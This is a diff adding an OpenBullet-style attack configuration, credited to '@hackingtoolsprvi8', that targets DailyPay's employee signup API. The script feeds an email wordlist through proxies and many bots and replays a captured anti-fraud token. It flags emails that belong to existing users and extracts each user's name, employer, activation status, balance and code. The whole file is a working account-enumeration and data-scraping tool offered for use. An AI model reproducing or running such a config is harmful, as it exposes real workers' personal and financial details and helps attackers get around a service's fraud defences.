@@ -1,0 +1,94 @@
+[SETTINGS]
+{
+  "Name": "DailyPay VM(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-05-18T15:07:02.1330242+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://employees-api.dailypay.com/v1/signup_users.json/" 
+  CONTENT "{\"signup_user\":{\"first_name\":null,\"last_name\":null,\"email\":\"<USER>\",\"phone_number\":null,\"external_id\":null},\"referral\":{\"code\":null},\"use_jwt\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: employees-api.dailypay.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 160" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"101\", \"Google Chrome\";v=\"101\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "x-castle-request-token: 5OHlhz-E9NK5YENVw19hD6VgQJcfe5m0U4nTscXkdpNqM2uDayY7t-y4b6hvKEaIXj5VmizSa99pRTRZzG9u4vg6Y89nOBT0GHUE6gJUB_FEDUWgSxA8-QVcBOcYGCXESwlbvlsDS8cCVl2kUBgTpl8RS9EbSAf1PF0J2wJMRKVYD0WjXRhD2yNsJtxHGAf5AF1L1w5bAP9CGCj4GVcG9UQJW6FFCEWkUg1avl8JS8MKXgriAhdeo1wWWKYHPw2hXw4JowlPaJfgOP-YDwEOo1xeWfT3fyreLHQusEN2PdkvcSq8S3Y92S9xKrAsXS3_GVsOsDlsM7BZCF2gS3wC4g5bH6MvCVqwHUs0pTQIS-AYZ17PWxRL1Fh8WqFCnH-hRAlEoVIPW7xLDVGjWwJboEt5Jj9jON6xro4WW2vrak3oKIyQgDuc3QQ8T-2UOiN4a6drId2Wa062lhmQa43PJcGX9iDJgggqCHwv0Ks4a5Brk_0j95f3xj9YP_AzitkD-H4vcBt494dvOHyQazdrbw" 
+  HEADER "crossDomain: true" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "Origin: https://my.dailypay.com" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "user\":null," 
+  KEYCHAIN Success OR 
+    KEY "user\":{\"activated\":" 
+
+PARSE "<SOURCE>" JSON "activated" CreateEmpty=FALSE -> CAP "Activated" 
+
+PARSE "<SOURCE>" JSON "name" CreateEmpty=FALSE -> CAP "Site" 
+
+PARSE "<SOURCE>" JSON "first_name" -> VAR "F" 
+
+PARSE "<SOURCE>" JSON "last_name" -> VAR "N" 
+
+FUNCTION Constant "<F> <N>" -> CAP "Name" 
+
+PARSE "<SOURCE>" LR "\"],\"onboard_balance_cents\":" "," CreateEmpty=FALSE -> CAP "Balance" 
+
+PARSE "<SOURCE>" JSON "code" CreateEmpty=FALSE -> CAP "Code" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
